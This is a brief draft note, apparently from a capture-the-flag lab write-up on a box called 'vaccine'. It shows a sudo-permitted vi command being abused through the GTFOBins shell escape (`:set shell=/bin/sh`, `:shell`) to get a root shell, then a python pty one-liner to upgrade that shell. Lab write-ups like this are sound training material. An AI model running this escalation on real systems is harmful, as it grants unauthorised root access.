---
title: 11_Privilege_Escalation
draft: true
tags:
  - tag1
  - tag2
NeedsReview: true
---

$ sudo -l

User postgres may run the following commands on vaccine:

(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

Using [https://gtfobins.github.io/gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo) we can see how to abuse privileges from vulnerable commands.

for this scenario, we set shell to /bin/sh

:set shell=/bin/sh

Then we run the shell

:shell

We can now beautify our shell again:

$ python3 -c 'import pty;pty.spawn("/bin/bash")'